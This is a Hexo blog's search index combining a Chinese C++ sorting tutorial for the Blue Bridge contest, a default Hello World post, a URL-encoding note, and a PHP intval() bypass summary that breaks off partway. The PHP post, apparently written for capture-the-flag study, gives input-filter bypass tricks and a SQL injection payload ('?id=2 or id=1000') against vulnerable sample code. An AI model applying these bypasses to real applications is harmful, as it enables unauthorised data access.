<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>re</title>
      <link href="/re.html"/>
      <url>/re.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/blue-bridge-cup.html"/>
      <url>/blue-bridge-cup.html</url>
      
        <content type="html"><![CDATA[<p>竞赛章程：<a href="https://dasai.lanqiao.cn/notices/839/">https://dasai.lanqiao.cn/notices/839/</a></p><p>oi赛制</p><h2 id="C-自带的sort排序函数的使用"><a href="#C-自带的sort排序函数的使用" class="headerlink" title="C++自带的sort排序函数的使用"></a>C++自带的sort排序函数的使用</h2><p>需要引用算法库</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure><p>通过写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr,arr+5)</span><br></pre></td></tr></table></figure><p>我们可以将arr中从开始的元素到第5个元素按从小到大的顺序排列</p><p>而如果我们写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr+i,arr+j)</span><br></pre></td></tr></table></figure><p>那么被排序的将是arr[i]到arr[j-1]，其他元素将保持原位置</p><p>默认是从小到大排序，如果要从大到小排，则可以传入第三个参数–排序方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="built_in">sort</span>(arr,arr+<span class="number">5</span>,<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br></pre></td></tr></table></figure><p>其中，greater表示更大的意思，<code>&lt;int&gt;</code>表示待排序的数组中的元素类型为int</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> arr[]=&#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>&#125;;</span><br><span class="line">sort(arr,arr+<span class="number">5</span>,greater&lt;<span class="type">int</span>&gt;());</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串的两种风格"><a href="#字符串的两种风格" class="headerlink" title="字符串的两种风格"></a>字符串的两种风格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//c风格字符串</span><br><span class="line">char arr[]=&quot;hello world&quot;;</span><br><span class="line">//c++风格字符串</span><br><span class="line">#include &lt;string&gt; //在使用c++风格的字符串要包含这个头文件</span><br><span class="line">string arr = &quot;hello world&quot;</span><br></pre></td></tr></table></figure><p>c++读入字符串并打印</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string arr = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">cout &lt;&lt; arr &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c语言读入字符串并打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;您输入的字符串是：%s\n&quot;</span>, str);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c语言读入整形数组元素并打印</p><p>需要注意的是scanf读入的时候遇到空白字符（空格、制表符、换行符等）或者文件结束符时停止读取，所以输入的时候数字要通过空格或者换行隔开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">sort(arr,arr+<span class="number">10</span>,greater&lt;<span class="type">int</span>&gt;());</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; arr[j] &lt;&lt; &quot; &quot;; //空格隔开</span><br></pre></td></tr></table></figure><h3 id="末尾严格控制空格"><a href="#末尾严格控制空格" class="headerlink" title="末尾严格控制空格"></a>末尾严格控制空格</h3><p>知道个数时，判断结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for(int i=1;i&lt;=6;i++)&#123;</span><br><span class="line">if(i!=6)&#123;</span><br><span class="line">cout &lt;&lt; B[i] &lt;&lt; &quot; &quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">cout &lt;&lt; B[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>不知道个数时,判断开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(int i=1;i&lt;=6;i++)&#123;</span><br><span class="line">if(i==1)&#123;</span><br><span class="line">cout &lt;&lt; B[i]; </span><br><span class="line">&#125;else&#123;</span><br><span class="line">cout &lt;&lt; &quot; &quot; &lt;&lt; B[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 C++ 的标准库中，<code>sort</code> 函数可以接受一个比较函数作为参数，以便在排序时确定元素的顺序。这个比较函数需要满足一定的条件，它应该接受两个参数（通常是被比较的两个元素），并返回一个布尔值，表示两个元素的比较结果。如果返回 <code>true</code>，则第一个参数应该排在第二个参数之前；如果返回 <code>false</code>，则第一个参数应该排在第二个参数之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bool cmp(int x,int y)&#123; //函数名可以随意</span><br><span class="line">return x&gt;y;</span><br><span class="line">&#125;</span><br><span class="line">sort(arr,arr+10,cmp);</span><br></pre></td></tr></table></figure><h3 id="结构体赋初值"><a href="#结构体赋初值" class="headerlink" title="结构体赋初值"></a>结构体赋初值</h3><p>对于开发更加复杂的程序，我们往往会许哟啊构造函数在初始化的过程中做很多事情，但是对于竞赛 来说，我们只需要构造函数给结构体赋初值就行了，所以我们其实可以使用另一种更加简单的方式，初始化列表，来直接对结构体成员进行初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line">string name;</span><br><span class="line"><span class="built_in">student</span>() &#123;&#125; <span class="comment">//注意不可省略默认构造函数</span></span><br><span class="line"><span class="built_in">student</span>(string n,ing s): <span class="built_in">name</span>(n),<span class="built_in">score</span>(s) &#123;&#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如上所示，初始化列表的写法是，在构造函数的括号后面加一个冒号，然后按照<code>成员变量（参数）</code>的格式，依次对每一个变量进行初始化，彼此之间用逗号隔开。</p><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"><span class="built_in">student</span>() &#123;&#125;</span><br><span class="line"><span class="built_in">student</span>(string n,<span class="type">int</span> s): <span class="built_in">name</span>(n),<span class="built_in">score</span>(s) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">student stu[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> s;</span><br><span class="line">string n;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; s;</span><br><span class="line">stu[i]=<span class="built_in">student</span>(n,s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].score &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对结构体进行排序：</p><p>输入三个学生的四科分数并按照分数从高到低排序 ，先看第一科，再看第二科依次类推</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> score[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(student x,student y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x.score[<span class="number">0</span>]!=y.score[<span class="number">0</span>])&#123;</span><br><span class="line"><span class="keyword">return</span> x.score[<span class="number">0</span>]&gt;y.score[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x.score[<span class="number">1</span>]!=y.score[<span class="number">1</span>])&#123;</span><br><span class="line"><span class="keyword">return</span> x.score[<span class="number">1</span>]&gt;y.score[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x.score[<span class="number">2</span>]!=y.score[<span class="number">2</span>])&#123;</span><br><span class="line"><span class="keyword">return</span> x.score[<span class="number">2</span>]&gt;y.score[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x.score[<span class="number">3</span>]!=y.score[<span class="number">3</span>])&#123;</span><br><span class="line"><span class="keyword">return</span> x.score[<span class="number">3</span>]&gt;y.score[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">student stu[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">cin &gt;&gt; stu[i].name;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">cin &gt;&gt; stu[i].score[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(stu,stu+<span class="number">3</span>,cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].score[j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排序函数的名字是可以随意命名的，也可以同时定义多个排序函数，根据实际情况调用</p><p><img src="/../img/image-20240323172043832.png" alt="image-20240323172043832"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()&#123;</span><br><span class="line">int N,l1,r1,l2,r2;</span><br><span class="line">int score[105];</span><br><span class="line">scanf(&quot;%d%d%d%d%d&quot;,&amp;N,&amp;l1,&amp;r1,&amp;l2,&amp;r2);</span><br><span class="line">for(int i=0;i&lt;N;i++)&#123;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;score[i]);</span><br><span class="line">&#125;</span><br><span class="line">sort(score+l1-1,score+r1);</span><br><span class="line">sort(score+l2-1,score+r2,greater&lt;int&gt;());</span><br><span class="line">for(int i=0;i&lt;N;i++)&#123;</span><br><span class="line">if(i==0)&#123;</span><br><span class="line">printf(&quot;%d&quot;,score[i]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">printf(&quot; %d&quot;,score[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排序两个数的所有位相加的和从小到大，如果相同则比较原数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bool cmp(int a,int b)&#123;</span><br><span class="line">int aa=a,bb=b;</span><br><span class="line">int suma = 0,sumb = 0;</span><br><span class="line">while(a)&#123;</span><br><span class="line">suma+=a%10;</span><br><span class="line">a/=10;</span><br><span class="line">&#125;</span><br><span class="line">while(b)&#123;</span><br><span class="line">sumb+=b%10;</span><br><span class="line">b/=10;</span><br><span class="line">&#125;</span><br><span class="line">if(suma ==sumb)&#123;</span><br><span class="line">return aa&lt;bb;</span><br><span class="line">&#125;</span><br><span class="line">return suma &lt;sumb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world.html"/>
      <url>/hello-world.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackergame2023_misc</title>
      <link href="/hackergame2023-misc.html"/>
      <url>/hackergame2023-misc.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>编码</title>
      <link href="/%E7%BC%96%E7%A0%81.html"/>
      <url>/%E7%BC%96%E7%A0%81.html</url>
      
        <content type="html"><![CDATA[<h2 id="浏览器url编码"><a href="#浏览器url编码" class="headerlink" title="浏览器url编码"></a>浏览器url编码</h2><p>1.将空格转换为加号（+）</p><p>2.对0-9、a-z、A-Z之间的字符保持不变</p><p>3.对于所有其他的字符，用这个字符的当前当前字符集编码在内存中的十六进制格式表示，并在每一个字节前加上一个百分号（%），如字符“+”是用%2B表示，字符“&#x3D;”用%3D表示，字符“&amp;”用%26表示，每个中文字符在内存中占两个字节，字符“中”用%D6%D0表示，字符“国”用%B9%FA表示。</p><p>4.空格也可以直接用其十六进制编码方式，即用%20表示，而不是将它转换为加号（+）</p><p>5、浏览器通常会对URL中的其他特殊字符，如空格（编码为<code>%20</code>）、斜杠（编码为<code>%2F</code>）、冒号（编码为<code>%3A</code>）等进行编码，以确保URL的正确性和可传输性。但对于<code>&amp;</code>字符，通常不进行编码，因为它在URL中有特定的分隔作用。</p><p>6、浏览器通常不会对竖线字符（<code>|</code>）进行编码，因为竖线在URL中通常被视为普通字符，而不是特殊字符。 URL编码主要用于将特殊字符转换为URL安全格式，以确保它们可以正确传输和解析，同时不干扰URL的结构</p><p>在使用url进行参数传递时，经常会传递一些中文名（或含有特殊字符）的参数或URL地址，在后台处理时会发生转换错误。这些特殊符号在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了</p><table><thead><tr><th>序号</th><th>特殊字符</th><th>含义</th><th>十六进制值</th></tr></thead><tbody><tr><td>1</td><td>+</td><td>URL 中+号表示空格</td><td>%2B</td></tr><tr><td>2</td><td>空格</td><td>URL中的空格可以用+号或者编码</td><td>%20</td></tr><tr><td>3</td><td>&#x2F;</td><td>分隔目录和子目录</td><td>%2F</td></tr><tr><td>4</td><td>?</td><td>分隔实际的 URL 和参数</td><td>%3F</td></tr><tr><td>5</td><td>%</td><td>指定特殊字符</td><td>%25</td></tr><tr><td>6</td><td>#</td><td>表示书签</td><td>%23</td></tr><tr><td>7</td><td>&amp;</td><td>URL 中指定的参数间的分隔符</td><td>%26</td></tr><tr><td>8</td><td>&#x3D;</td><td>URL 中指定参数的值</td><td>%3D</td></tr></tbody></table><p><img src="/img/image-20231104164730812.png" alt="image-20231104164730812"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php函数绕过总结</title>
      <link href="/php%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html"/>
      <url>/php%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>函数绕过的前提是对应的php版本</p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure><p>函数作用：获取变量的整数值</p><p>0x:16   0:8  0b:2  默认10</p><h3 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h3><p>当函数中用<code>字符串</code>方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo intval(1e10);              // 1410065408</span><br><span class="line">echo intval(&#x27;1e10&#x27;);            // 1</span><br><span class="line">echo intval(&#x27;1e10&#x27;+1);          // 1410065409</span><br></pre></td></tr></table></figure><p>应用场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (intval($_GET[&#x27;lover&#x27;]) &lt; 2023 &amp;&amp; intval($_GET[&#x27;lover&#x27;] + 1) &gt; 2024)</span><br></pre></td></tr></table></figure><h3 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h3><p>当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过。</p><p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p><ul><li><p>如果 $var 以 0 开头，就使用 8进制</p></li><li><p>如果 $var 以0x开头，就使用 16进制</p></li><li><p>否则，就使用 10进制</p></li></ul><h3 id="转换字符串特性绕过"><a href="#转换字符串特性绕过" class="headerlink" title="转换字符串特性绕过"></a>转换字符串特性绕过</h3><ul><li>如果以数字开头，就返回1个或多个连续的数字</li><li>如果以字母开头，就返回0</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br></pre></td></tr></table></figure><p>payload:<code>?id=2 or id=1000</code></p><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素，有为1无为0</p><p>三种数组写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a[]=1;</span><br><span class="line">     </span><br><span class="line">$a=array(1,2);</span><br><span class="line">     </span><br><span class="line">$a=[1,2];</span><br></pre></td></tr></table></figure><p>但在传参时一般使用第一种形式，经过测试发现，传参默认都是字符串类型，根据intval的字符串转换规则，如果字符串第一个字符不是数字就会直接返回0，所以后面两种形式都是返回0，只有第一种可以正确返回数字1</p><p><img src="/img/image-20231101235921465.png" alt="image-20231101235921465"></p><h3 id="取反-绕过"><a href="#取反-绕过" class="headerlink" title="取反~绕过"></a>取反~绕过</h3><p>当某个数字被过滤时，可以两次取反来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 